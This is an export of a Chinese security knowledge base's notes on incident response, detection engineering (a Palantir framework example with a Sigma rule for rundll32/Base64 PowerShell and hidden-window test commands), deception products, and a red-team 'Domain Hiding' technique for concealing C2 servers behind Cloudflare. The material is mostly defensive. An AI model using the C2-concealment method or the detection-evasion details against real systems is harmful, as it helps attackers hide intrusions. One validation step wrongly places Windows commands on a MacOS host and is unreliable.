[网络安全产业人才岗位能力要求](http://www.miitxxzx.org.cn/module/download/downfile.jsp?classid=0&showname=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E5%B2%97%E4%BD%8D%E8%83%BD%E5%8A%9B%E8%A6%81%E6%B1%82(1).pdf&filename=a1082cbbb71e422487b2e2c30526d7ea.pdf)\r\n  - 通过日志进行事件调查，并帮助了解发生了什么、何时以及如何发生的\r\n    - 在确定要存储哪些日志时，还应考虑任何适用的法规。例如，GDPR 对“[数据最小化](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/principles/data-minimisation/)”的要求意味着安全日志不应包含个人数据\r\n    - 日志保留期的选择应再次与可能的现实威胁和调查要求保持一致;日志的存储时间应该是它们通常对团队有用的时间。(例如，这可能是基于可能的攻击者的平均停留时间。[FireEye 的 2021 M-Trends报告](https://content.fireeye.com/m-trends/rpt-m-trends-2021)确定了非勒索软件调查的中位停留时间为 45 天，其中 25% 的非勒索软件调查的停留时间为 200 多天)\r\n  - 执行**遏制**和**根除**行动以减轻事件风险的技术\r\n    - **基于主机/网络/身份**\r\n  - **事件响应团队的协调**技术，用于沟通和协作、委派和跟踪响应行动以及管理交付\r\n    - **沟通:** 内部和与外部合作伙伴的同步（例如，视频和电话呼叫和会议）和异步（例如，文本聊天）通信。\r\n    - **协作:** 在内部和与外部合作伙伴的工作上进行协作。\r\n    - **任务跟踪:** 记录响应事件所需的任务，跟踪截止日期、工作量、状态、受让人和后续步骤。这可以通过简单的电子表格或 Jira 等专用任务跟踪系统来实现。\r\n    - **报告:** 捕获每个事件的关键统计数据（例如，使用常见的模式，如VERIS），并输出这些数据以启用管理报告。\r\n\r\n  # 4. 参考\r\n  - [https://medium.com/nerd-for-tech/how-to-plan-detect-assess-and-respond-to-information-security-incidents-by-using-iso-iec-27035-ed744c8b7cd5](https://medium.com/nerd-for-tech/how-to-plan-detect-assess-and-respond-to-information-security-incidents-by-using-iso-iec-27035-ed744c8b7cd5)\r\n  - [https://gabrielcurrie.medium.com/ready-for-nearly-anything-five-things-to-prepare-for-a-cyber-security-incident-4fc49d665488](https://gabrielcurrie.medium.com/ready-for-nearly-anything-five-things-to-prepare-for-a-cyber-security-incident-4fc49d665488)\r\n  - [https://docs.microsoft.com/en-us/microsoft-365/security/defender/incidents-overview?view=o365-worldwide#incidents-and-alerts-in-the-microsoft-365-defender-portal](https://docs.microsoft.com/en-us/microsoft-365/security/defender/incidents-overview?view=o365-worldwide#incidents-and-alerts-in-the-microsoft-365-defender-portal)\r\n  - [https://docs.aws.amazon.com/whitepapers/latest/aws-security-incident-response-guide/cloud-security-incidents.html](https://docs.aws.amazon.com/whitepapers/latest/aws-security-incident-response-guide/cloud-security-incidents.html)\r\n  - [https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf)\r\n  - [https://www.iso.org/standard/60803.html](https://www.iso.org/standard/60803.html)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/文件分析/长亭的webshell检测漫画挺有意思/","title":"长亭的webshell检测漫画挺有意思"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 长亭的webshell检测漫画挺有意思\r\ntags:\r\n- Blue Team能力建设\r\n- 文件分析\r\n- webshell\r\n- 长亭\r\n---\r\n\r\n# 1. Webshell检测能力进化笔记\r\n![MI9b1J](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/MI9b1J.jpg)\r\n![cQOAWO](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/cQOAWO.jpg)\r\n![l546Tq](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/l546Tq.jpg)\r\n![ttV8uD](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ttV8uD.jpg)\r\n![ttV8uD](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ttV8uD.jpg)\r\n![mVvDs3](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/mVvDs3.jpg)\r\n\r\n# 2. 参考资料\r\n- [https://mp.weixin.qq.com/s/ehWF7ZAWv0gRi9U9Aacvfw](https://mp.weixin.qq.com/s/ehWF7ZAWv0gRi9U9Aacvfw)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/检测工程/如何提升威胁检测能力？——Palantir威胁检测框架介绍/","title":"如何提升威胁检测能力？——Palantir威胁检测框架介绍"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 如何提升威胁检测能力？——Palantir威胁检测框架介绍\r\ntags:\r\n- Blue Team能力建设\r\n- 检测工程\r\n- 威胁检测\r\n- Palantir\r\n- 框架\r\n---\r\n\r\n# 1. 背景\r\n有效的威胁检测是确保安全营运正常运作的关键要求之一，要先能“看见”，才能做后续的响应和处置；对于安全运营同学来说，在制定检测策略和后期运营时会遇到几个问题：\r\n\r\n- 缺乏规范的文档和标准，整体质量难以保证，导致低质量的检测策略部署到生产系统，造成产生过多/无效的告警（False Positive）会造成安全团队的疲惫感和不信任感，而更加危险的是检测策略未覆盖的部分（False Negative），我们无法应对“未知”的风险。\r\n- 检测规则产生的安全告警缺少有效的上下文信息，无法帮助值班的应急人员；他们可能不熟悉漏洞/应用的相关信息、无法判断是否为误报、如何处置的真实告警等。\r\n- 没有版本控制和同行评审，告警的优先级可能不一致或不明确。\r\n\r\nPalantir的安全团队分享了内部是如何构建威胁检测策略的，提出了自己的威胁检测框架，试图从文档模板、流程和约定规则方面来提高检测策略的质量和效率。\r\n\r\n# 2. 威胁检测框架—Alerting and Detection Strategy Framework（ADS）\r\n\r\n该框架帮助我们构建检测规则的生成、测试和管理，包含以下部分：\r\n\r\n- 目标：给出了应该检测的行为类型的简短明文描述。\r\n- 分类：提供了到MITRE ATT&CK相关条目的映射。\r\n- 策略摘要：描述了检测策略正在寻找什么、使用了哪些技术和数据源、相关上下文以及减少误报的优化措施等。\r\n- 技术背景：提供了解检测策略和告警所需的详细信息和背景；目标是为运营人员提供一个独立的参考，以对任何潜在的安全告警做出判断。\r\n- 盲点和假设：没有检测策略是绝对完美的，识别假设和盲点可以帮助其他工程师了解检测策略可能被绕过的具体情况。\r\n- 误报：由于配置错误、环境特性或其他非恶意场景而导致检测策略误报的已知实例。\r\n- 验证：列出了生成触发此告警所需的步骤；类似单元测试，可以是用于生成告警的POC/脚本等。\r\n- 优先级：描述了各种安全告警级别和相关标准。\r\n- 响应：触发此告警时的一般响应步骤，这些步骤指导运营人员对告警进行分类和调查。\r\n- 其他资源：可能有助于理解的任何其他内部、外部或技术参考资料。\r\n\r\n在部署新的检测策略之前，必须完成上述的每个部分。这保证了任何安全告警都有足够的文档，并经过验证。所有文档都会受版本控制和集中管控；在检测策略后续的优化迭代过程中，需要不断修改变更对应的文档，确保文档保持最新状态。\r\n\r\n# 3. 实际案例\r\n## 策略名称：Unusual-Powershell-Host-Process\r\n- **目标**\r\n  - 检测“没有 PowerShell 的 PowerShell”攻击，这些活动涉及不直接调用 powershell.exe 执行的PowerShell 命令和脚本。\r\n- **分类**\r\n  - [Execution / Powershell](https://attack.mitre.org/wiki/Technique/T1086)\r\n- **策略摘要**\r\n  - 该策略的作用如下：\r\n    - 通过Windows系统的终端agent监控模块加载（module loads）行为\r\n    - 监控任何加载 powershell DLL 的进程（system.management.automation.dll 或system.management.automation.ni.dll）\r\n    - 排除已知路径/进程名的正常powershell主机进程（host processes）\r\n    - 告警任何异常的powershell主机进程（host processes）\r\n  - SIGMA规则示例如下，具体受篇幅限制就省略了 :)\r\n    ```\r\n      title: Detection of PowerShell Execution via DLL\r\n      logsource:\r\n          category: process_creation\r\n          product: windows\r\n      detection:\r\n          selection1:\r\n              Image|endswith:\r\n                  - '\\\\rundll32.exe'\r\n          selection2:\r\n              Description|contains:\r\n                  - 'Windows-Hostprozess (Rundll32)'\r\n          selection3:\r\n              CommandLine|contains:\r\n                  - 'Default.GetString'\r\n                  - 'FromBase64String'\r\n          condition: (selection1 or selection2) and selection3\r\n    ```\r\n- **技术背景**\r\n  - PowerShell 命令和脚本可以通过加载底层 System.Management.Automation 命名空间来执行，该命名空间通过 .NET 框架和 Windows 公共语言接口 (CLI) 公开，Powershell 实际上是一个名为system.management.automation.dll 的 DLL，它也可能以本机映像格式存在，如system.management.automation.ni.dll。\r\n  - Powershell DLL 可以加载到多个进程中，这些进程称为 powershell 主机进程。包括 powershell.exe 或 powershell 集成脚本环境 (powershell_ise.exe) 、以及 Exchange 和 Azure Active Directory 的同步进程等；Powershell 主机进程一般都有微软签名的数字签名。\r\n  - 攻击者喜欢利用 Powershell进行攻击，因为它提供了一个高级接口来与操作系统交互，而无需在 C、C# 或 .NET 中开发功能。虽然许多攻击者会直接使用Powershell进程，但更老练的攻击者可能会选择更加隐秘的方法，将 powershell 注入非原生的Powershell主机进程来绕过应用程序白名单和环境限制，详见：[unmanaged powershell](https://github.com/leechristensen/UnmanagedPowerShell)\r\n  - 许多工具允许使用 DLL 运行 PowerShell。例如，“PowerShdll”和“NoPowerShell” ，他们依赖于 LOLBIN（无落地攻击文件），如 rundll32.exe、installutil.exe、regsvcs.exe、regasm.exe 和 regsvr32.exe 来调用 DLL。这些 LOLBIN 由微软签名并经常列入白名单。如下图是PowerShell 使用 rundll32 调用 DLL ，会出现一个带有 PowerShell 控制台的新窗口，这是进程中是不存在powershell.exe的。\r\n  - ![07pyjj](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/07pyjj.jpg)\r\n- **盲点和假设**\r\n  - 该策略依赖于以下假设：\r\n    - Windows系统的终端agent正常运行\r\n    - 正常监控所有模块加载（module loads）的行为\r\n    - 终端收集的日志被发往SOC/SIEM等平台\r\n    - SOC/SIEM加载检测策略进行分析\r\n  - 如果违反任何假设，就会出现盲点。例如，以下内容会触发告警：\r\n    - 合法的 Powershell 主机进程被滥用（例如 powershell.exe）\r\n    - 列入白名单的 Powershell 主机进程被滥用\r\n    - 终端Agent被攻击者控制\r\n- **误报**\r\n  - 有几种情况会发生误报：\r\n    - 合法的 powershell 触发告警，并且没有通过白名单进行加白\r\n  - 合法的 powershell 进程通常有如下特征：\r\n    - 调用方有合法的数字签名\r\n    - Powershell 使用标准方法（例如 LoadLibrary）将本机 Powershell 库加载到内存中\r\n    - 信任的二进制文件\r\n- **优先级**\r\n  - 在所有条件下，优先级都设置为中等\r\n- **验证**\r\n  - 通过在 MacOS 主机上执行以下命令来验证：\r\n    ```\r\n      Copy-Item C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -Destination C:\\\\windows\\\\temp\\\\unusual-powershell-host-process-test.exe -Force \r\n      Start-Process C:\\\\windows\\\\temp\\\\unusual-powershell-host-process-test.exe -ArgumentList '-NoProfile','-NonInteractive','-Windowstyle Hidden','-Command {Get-Date}' \r\n      Remove-Item 'C:\\\\windows\\\\temp\\\\unusual-powershell-host-process-test.exe' -Force -ErrorAction SilentlyContinue\r\n    ```\r\n- **响应**\r\n  - 如果触发此警报，建议采用以下响应程序：\r\n    - 将可疑的 powershell 进程与白名单上进行比较\r\n      - 请注意是否存在由于路径或驱动器号差异导致的小问题\r\n    - 检查数字签名\r\n      - 使用工具或 powershell 来确定二进制文件是否经过数字签名\r\n      - 对签名者和二进制文件进行置信度确认\r\n    - 确定二进制文件是否对应于已安装的应用程序\r\n      - 查看 osquery 以查找可能与二进制文件匹配的已安装软件包\r\n    - 查看二进制文件的行为\r\n      - 是否进行了任何异常的网络连接？\r\n      - 是否产生了任何子进程？\r\n      - 是否进行了任何可疑的文件修改？如果二进制文件不可信，或无法追踪到合法安装的应用程序，将其视为潜在危害并升级为安全事件。\r\n- **其他资源**\r\n  - https://github.com/Mr-Un1k0d3r/PowerLessShell\r\n  - https://github.com/leechristensen/UnmanagedPowerShell\r\n  - https://www.blackfog.com/fileless-powershell-protection/\r\n\r\n# 4. 思考\r\n- 如何构建好的威胁检测能力？首先，**目标应该明确**，模糊的的目标会导致无法落地执行；其次是要**做出一些假设**，因为我们不可能掌握所有信息，这个世界充满了不确定性，当面对不确定性时，必须通过假设，来不断证伪和修正。比如我们想检测CoblatStrike，是检测beacon还是它执行的一个或者多个功能呢？是否要考虑在不同环境、不同版本、不同网络架构的区别？在终端层、网络层、身份认证数据等不同检测维度下，分别该如何检测和联动？等等这些问题都需要在一个个的假设下去完成。最后是**上下文信息**，当我们看到一个警告时，从标题和内容并不知道它是用来做什么的、它的检测机制是怎样的、应该用它做什么？\r\n- Palantir的威胁检测框架在很大程度上在尝试解决上述的问题，当然，在这个过程中，离不开专家知识、人工处置、足够全的数据和自动化操作等。\r\n\r\n# 5. 参考资料\r\n- [https://blog.palantir.com/alerting-and-detection-strategy-framework-52dc33722df2](https://blog.palantir.com/alerting-and-detection-strategy-framework-52dc33722df2)\r\n- [https://www.paloaltonetworks.com/blog/security-operations/stopping-powershell-without-powershell](https://www.paloaltonetworks.com/blog/security-operations/stopping-powershell-without-powershell)\r\n- [https://cloud.withgoogle.com/cloudsecurity/podcast](https://cloud.withgoogle.com/cloudsecurity/podcast)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/检测工程/如何提升威胁检测能力？——SpecterOps漏斗模型介绍/","title":"如何提升威胁检测能力？——Palantir威胁检测框架介绍"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 如何提升威胁检测能力？——Palantir威胁检测框架介绍\r\ntags:\r\n- Blue Team能力建设\r\n- 检测工程\r\n- 威胁检测\r\n- SpecterOps\r\n- 框架\r\n---\r\n\r\n# 1. 背景\r\nSpecterOps在与客户合作构建威胁检测和响应能力的过程中，发现两个痛点问题：1、人力有限，无法响应每一个安全事件；2、检测响应流程中理想与现实的脱节。因此发明了漏斗模型(Funnel of Fidelity)，量化了在不同阶段，不同角色所担任的职责是什么。随着模型从左到右层层过滤，安全事件分析的深度和真实度会逐步增加。\r\n\r\n# 2. 漏斗模型\r\n在威胁检测和响应中，我们的目标是如何高效利用有限的资源来达成目的，因此需要过滤掉无用的信息，把注意力集中的大概率为真的安全事件上。漏斗模型包含了数据收集、威胁检测、安全分析、事件调查和修复，每个阶段都是检测和响应程序的关键组成部分，如果只重点关注/忽视某些阶段，则会导致漏斗的流动出现问题，如：\r\n\r\n- 没有收集管控遥测数据的SIEM/SOC平台，或收集不全、覆盖不足、解析不够\r\n- 威胁检测能力不足，无法有效产生可以用来调查的安全告警\r\n- 没有足够的安全事件响应计划和演习，虽然可以检测到攻击，但无法以可靠的方式对其进行补救\r\n\r\n下面是漏斗模型的可视化表示，将箭头的大小想象为每个阶段必须处理的输入数量。过滤发生在每个彩色环上，以减少传递到流程下一步的通用事件的量级。\r\n\r\n- ![pEk7pn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/pEk7pn.jpg)\r\n- 漏斗模型由五个阶段组成：数据收集、威胁检测、安全分析、事件调查和修复。每个阶段采用前一阶段生成的输入，执行某种过滤或降噪，并为下一个阶段生成输出。理想情况下，每个阶段都允许对相关事件进行更深入或更多的手动分析，因为不相关的事件都会被过滤掉。下面会深入讲一讲各个阶段，包括了负责的角色、输入和输出。\r\n\r\n**阶段一：日志收集**\r\n\r\n- 角色：数据工程师\r\n- 输入：探针/Agent等Sensor\r\n- 输出：事件\r\n- 日志收集是威胁检测和响应过程中最基础的部分，提供了有关整个环境中发生的活动的上下文信息。如果没有数据，几乎不可能检测到恶意活动。成熟的安全团队应该应努力集中尽可能多的遥测数据，以支持后续的检测和响应。例如，Windows 事件日志在本地生成和存储，但必须进行转发收集才能发挥价值。\r\n\r\n**阶段二：威胁检测**\r\n\r\n- 角色：检测工程师\r\n- 输入：事件\r\n- 输出：安全告警\r\n- 通过集中相关事件，检测工程师定义检测逻辑来识别与安全威胁相关的事件。检测阶段的目标是将日志收集阶段的数百万乃至数亿的事件减少到数百甚至数千个安全告警，这些告警将在分析阶段进行分析。这些检测方法通常是工程师在和安全事件/漏洞的交互过程中产生的，并通过程序自动化的方式部署，以生成安全告警。\r\n\r\n**阶段三：安全分析**\r\n\r\n- 角色：安全分析师\r\n- 输入：安全告警\r\n- 输出：安全事件或者线索\r\n- 安全告警是检测逻辑的产出物，有一定数量的误报是合理的。在安全分析阶段，安全分析师将告警分类为恶意、正常和未知；恶意告警会被标识为安全事件，并发送到阶段四进行响应处置，而未知告警则被标识为线索，并发送到事件调查阶段，因为它需要额外的审查。\r\n- 这一阶段通常能难实现自动化识别，需要人工介入分析，但这就意味着能力、经验、上下文信息的不足会导致分析过程难以标准化。能力和经验需要招聘优秀的人才，并持续学习培养；而上下文信息不足会使分析师很难理解攻击的背景信息、产生告警的检测逻辑、完整的攻击链条以及应该如何识别恶意和正常。我们可以通过使用有完备信息的威胁检测框架（如 [[如何提升威胁检测能力？——Palantir威胁检测框架介绍]] ）来缓解这些问题。\r\n\r\n**阶段四：事件调查**\r\n\r\n- 角色：安全分析师\r\n- 输入：线索\r\n- 输出：安全事件\r\n- 安全分析阶段用于消除误报，并产生可控数量的未知事件（可能为个位数或两位数）。调查阶段用于收集在检测或分析阶段可能不可用的其他上下文。这可能涉及更多手动和可扩展性较低的分析，例如文件系统分析、内存取证、二进制分析等，以帮助识别安全事件的真正目的。由于前几个阶段发生的噪音减少，因此可以有足够的人力进行这种额外的审查。\r\n\r\n**阶段五：修复**\r\n\r\n- 角色：应急响应工程师\r\n- 输入：安全事件\r\n- 输出：N/A\r\n- 一旦确认发生安全事件，就必须开展补救活动。在此阶段，应急响应工程师会确定安全事件的范围并从系统和网络中消除影响。许多组织会与第三方合作完成补救活动并确保它们及时完成。\r\n\r\n# 3. 什么是威胁检测？\r\n在许多组织中，检测的概念往往非常微妙。出于这个原因，我们必须区分微观的检测（编写检测逻辑以发现潜在恶意事件的过程）和宏观的检测（从告警到补救的过程）。从宏观意义上讲，攻击必须导致某种补救活动，否则都被认为是被动检测而已。下面，我们将探讨两个关于检测概念混淆的案例。\r\n- **case 1**\r\n  - 在攻防对抗演练过程中，防守方在SIEM/SOC发现了攻击方的相关事件，然后就宣布：“我们成功抓到了攻击方！”。但其实他们虽然收集了与该攻击相关的信息，但尚未创建检测逻辑来检测该活动。这不能算是有效的威胁检测。\r\n- **case 2**\r\n  - 在攻防对抗演练过程中，防守方已经对特定的攻击技术构建了检测逻辑，如Kerberoasting，虽然触发了安全告警，但安全分析师对 Kerberoasting 的了解不够，无法区分中正常请求和恶意攻击。虽然在微观上确实检测到了攻击，但在宏观上，这并不是有效的威胁检测。\r\n- **总结**\r\n  - 漏斗模型的一个巨大好处是我们可以诊断故障发生在哪个阶段，在case 1中，似乎有足够的日志收集，但缺少威胁检测能力，我们可以通过使用在当前环境中收集的数据，来设计对应的威胁检测的策略。 在case 2中，我们看到系统生成了安全告警，但在分析阶段失败了，为了解决这个问题，我们可以专注于构建告警文档和培训帮助分析师完成工作。这两个例子都不应被视为威胁检测和响应的失败。相反，它们应该被视为改进整个过程的机会。\r\n\r\n# 4. 参考资料\r\n- [https://posts.specterops.io/introducing-the-funnel-of-fidelity-b1bb59b04036](https://posts.specterops.io/introducing-the-funnel-of-fidelity-b1bb59b04036)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[如何提升威胁检测能力？——Palantir威胁检测框架介绍]: 如何提升威胁检测能力？——Palantir威胁检测框架介绍.md \"如何提升威胁检测能力？——Palantir威胁检测框架介绍\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/安全知识库/Blue Team能力建设/欺骗防御/长亭欺骗解决方案/","title":"长亭欺骗解决方案"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 长亭欺骗解决方案\r\ntags:\r\n- Blue Team能力建设\r\n- 欺骗防御\r\n- 长亭\r\n---\r\n\r\n![cHIP7w](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/cHIP7w.jpg)\r\n![v1YfnP](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/v1YfnP.jpg)\r\n\r\n长亭科技先战而后师，凭借硬核实战能力，在动态对抗中研究攻击者最新、最高频攻击方式与路径，针对实战输出欺骗伪装专题私货，助力防守者4项战力升级，让攻击者不仅无法知彼，更无法知己，迷糊到底。\r\n\r\n# 战力一，策略布防，溯源反制显威力\r\n- 成功溯源并反制攻击者，是防守方最为过瘾的时刻之一。“授之以鱼，不如授之以渔“，防守方了解最新、最高频溯源和反制方式的实战策略布防原理，并将其结合实际业务环境落地，溯源反制威力将不可限量。\r\n- 溯源策略包括浏览器、webshell、Burp Suite 和 Webrtc\r\n- 反制策略包括客户端、Mysql、Git、某扫描器和浏览器爬虫\r\n- **溯源反制效果**\r\n  - ![SzML0Y](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/SzML0Y.jpg)\r\n\r\n# 战力二，联动扩大诱捕范围，诱捕效果更佳\r\n- 联动WAF、主机安全产品、态感平台等\r\n\r\n# 战力三，方案创新 ，大规模资产欺骗伪装无忧\r\n- 以最少的资源解决欺骗节点覆盖度问题，长亭谛听（D-Sensor）“大探针”内置多个网口，可同时接入多个网络区域。其单个网口可配置多个 VLAN 和多个 IP，通过 Trunk 模式将其接入到交换机上，可以在一个网络区域内实现多个 IP 和多个蜜罐绑定，在节约资源、成本的同时部署更多的伪装欺骗节点，迅速扩大欺骗范围，实现快速威胁感知和诱捕。\r\n\r\n# 战力四，安全为基，自身不成为攻击跳板\r\n![xR0YRc](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/xR0YRc.jpg)\r\n\r\n1. 探针直接转发，不对流量进行任何分析处理。攻击者无法从探针开放的端口攻击到探针宿主机。\r\n2. 管理节点对探针设备低信任，只接收直接转发过来的蜜罐流量和其他检测结果。即使攻击者通过其他方式攻陷了探针宿主机，也无法进一步攻击到管理节点。\r\n3. 严密的容器逃逸限制与检测，即使攻击者获取了蜜罐容器的权限，也不会危害到宿主机的安全。\r\n4. 通过关闭蜜网使用宿主机网络功能的权限，彻底切断蜜罐到其他网络的访问路径，确保蜜罐不会成为跳板。\r\n5. 前后端分离，完善的身份认证、渗透测试和网络隔离，使得攻击者无法从前台攻陷管理节点宿主机。\r\n\r\n# 参考资料\r\n- [https://mp.weixin.qq.com/s/zgXsA-oYViCgJuOcWjiWJA](https://mp.weixin.qq.com/s/zgXsA-oYViCgJuOcWjiWJA)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/欺骗防御/阿里云云原生蜜罐/","title":"阿里云云原生蜜罐"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 阿里云云原生蜜罐\r\ntags:\r\n- Blue Team能力建设\r\n- 欺骗防御\r\n- 阿里云\r\n---\r\n\r\n![bGN1LZ](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/bGN1LZ.jpg)\r\n\r\n# 参考资料\r\n- [https://mp.weixin.qq.com/s/qb62aPAyX6SOF2LwOebWKA](https://mp.weixin.qq.com/s/qb62aPAyX6SOF2LwOebWKA)"},{"fields":{"slug":"/安全知识库/Blue Team能力建设/欺骗防御/默安科技欺骗防御体系/","title":"默安科技欺骗防御体系"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 默安科技欺骗防御体系\r\ntags:\r\n- Blue Team能力建设\r\n- 欺骗防御\r\n- 默安科技\r\n---\r\n\r\n# 如何保证欺骗防御的效果和有效性？\r\n欺骗防御的效果和有效性可以从“覆盖面”和“融合度”两个方面入手。欺骗防御节点覆盖面越大、与真实网络的融合度越高，效果越好。\r\n\r\n- 扩大覆盖面\r\n  - 扩大欺骗防御节点的覆盖面需要投入大量成本，默安科技通过多种方案实现低成本、快速、大面积的覆盖。\r\n  - 与刃甲联动：服务诱捕\r\n    - 刃甲是默安科技自研的网络攻击干扰压制系统，它部署在互联网出口，通过旁路镜像方式部署，可将“空闲公网IP”的所有访问流量，都转发到蜜罐，实现互联网全部的非业务IP与蜜罐关联。此方案由刃甲与幻阵联动实现，可将幻阵部署至数据中心本地或公有云，攻击者以为攻击了真实IP，却不知“应用”实际在云上，实现调虎离山。\r\n    - ![x4YUFu](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/x4YUFu.jpg)\r\n  - 中继节点\r\n    - 通过Trunk方式实现蜜网的跨VLAN覆盖，单台中继节点即可覆盖对应汇聚交换机下的所有VLAN。利用网络中空闲IP将攻击流量诱导至蜜罐内，在节省部署成本的同时，实现蜜网节点的全面覆盖，避免蜜网因成本问题出现防守真空区域。\r\n    - ![9olmAl](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/9olmAl.jpg)\r\n  - 伪装代理/多IP模式\r\n    - 在一台空白虚拟机上部署伪装代理（Agent），同时在此虚拟机上绑定多个IP，当攻击者访问到这些IP时，流量将全部被转发到蜜罐。\r\n  - 威胁情报与集中管理\r\n    - 通过威胁情报中心与集中管理中心，将攻击者信息、踪迹、攻击轨迹、蜜罐设备等进行集中管理与集中展示。\r\n- 提高融合度\r\n  - 覆盖面可以增加成功诱捕攻击者的概率。但假如攻击者触达真实的业务系统，能否诱捕成功，就需要看蜜网与真实网络的融合度，是否做到了“你中我有、我中有你”。\r\n  - 与刃甲联动：网站诱\r\n    - 通过旁路部署刃甲，并接入交换机端口镜像，可为真实业务旁路插入攻击者感兴趣的URL，精准捕获其对真实业务的攻击行为。\r\n  - 伪装代理/融合模式\r\n    - 将伪装代理部署在真实业务服务器上，并启用虚假服务端口，当攻击者攻击到此端口时，流量将被转发到蜜罐。\r\n  - 沙箱定制\r\n    - 默安科技提供的定制服务，可根据用户业务特点，定制专属的仿真蜜罐，让攻击者分不清真假。\r\n  - 运营服务\r\n    - 欺骗防御是在攻击者的必经之路上部署陷阱，对攻击者进行诱捕。那么，攻击者的必经之路是什么？默安科技提供欺骗防御的安全运营服务，通过攻击者视角对目标企业进行“摸底”，量身定制部署方案，结合运营服务，对攻击者进行精准诱捕。\r\n\r\n# 如何将欺骗防御运用在常态化的安全运营中，而非“攻防演练专用”\r\n- 由于欺骗防御在近几年大型攻防演练中的出色表现，业界出现了一些“欺骗防御是攻防演练专用”的声音。其实不然，欺骗防御在常态化的安全运营中有着不可小觑的价值。\r\n- 补充现有检测能力的不足，发现未知威胁\r\n  - 现有安全检测产品大多基于黑名单或签名来检测已知威胁，针对未知威胁的有效解决方案极少。默安科技刃甲产品首先通过微蜜罐功能精准锁定攻击者，再抓取与其相关的全部流量，协助安全人员分析，捕获0day攻击。\r\n- 欺骗防御体系是企业安全的一道重要防线\r\n  - 攻击者突破到内网的方式很多，但对0day、社工等攻击方式防不胜防。这时对防守方来说，想要及时“止损”，最好的办法就是能尽早发现攻击者，找出被控主机。欺骗防御体系能够在内网部署大量欺骗节点，并使蜜网与真实业务网络融合。攻击者采用任意攻击方式、从任意网段侵入，为了扩大战果，都会做横向移动，此时就会掉入已部署的陷阱之中。\r\n- 建立私有威胁情报平台，联防联控\r\n  - 攻击者在攻击时，往往会先攻击分支相对脆弱的点，再通过分支作为跳板，对总部进行攻击。并且可能会在整个攻击过程中更换多个IP，使防守者无法还原整体攻击路径，只能被动防守。\r\n  - 欺骗技术最大的特点就是精准检测。默安科技能够为用户建设欺骗防御体系，在总部搭建威胁情报平台，通过设备指纹锁定攻击者，将其使用过的全部IP进行归并。在其攻击一个分支节点时，总部及其他的分支节点可进行预警，做到事前处置，形成整体的联防联控机制。\r\n\r\n# 参考资料\r\n- [https://mp.weixin.qq.com/s/gcFwMr6z9P_RoSmb0S0rIg](https://mp.weixin.qq.com/s/gcFwMr6z9P_RoSmb0S0rIg)"},{"fields":{"slug":"/安全知识库/Red Team能力建设/命令与控制 C2/域隐藏 Domain Hiding/","title":"域隐藏 Domain Hiding"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 域隐藏 Domain Hiding\r\ntags:\r\n- Red Team能力建设\r\n- 命令与控制 C2\r\n- Cloudflare\r\n---\r\n\r\n# 背景\r\n域前置 Domain Fronting 技术已经被主流的云厂商封禁，为了解决这个问题，Erik Hunstad发明了域隐藏Domain Hiding技术。它能实现域前置隐藏真实域名的目的，同时比域前置更灵活，只需要把域名DNS解析托管在Cloudflare，而主机服务器可以托管在任何地方。\r\n\r\n# TLS1.3+ESNI\r\n使用带有ESNI（加密的SNI）的TLS1.3请求发送到任意Cloudflare服务器\r\n\r\nHTTP请求的Host字段包含隐藏的目标域名（DNS解析托管到Cloudflare）\r\n\r\nCloudflare会把请求转发到隐藏的目标服务器\r\n\r\n![omRIwK](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/omRIwK.jpg)\r\n\r\n**目前该技术依赖Cloudflare：**\r\n\r\n- 2020-08-10: Cloudflare开始拒绝同时包含ESNI and SNI的ClientHello数据包\r\n- 包含ESNI的ClientHello数据包可以正常请求\r\n- 国内无法使用，原因见：https://geneva.cs.umd.edu/posts/china-censors-esni/esni/\r\n\r\n# 参考资料\r\n- [https://github.com/Ridter/DomainHiding](https://github.com/Ridter/DomainHiding)\r\n- 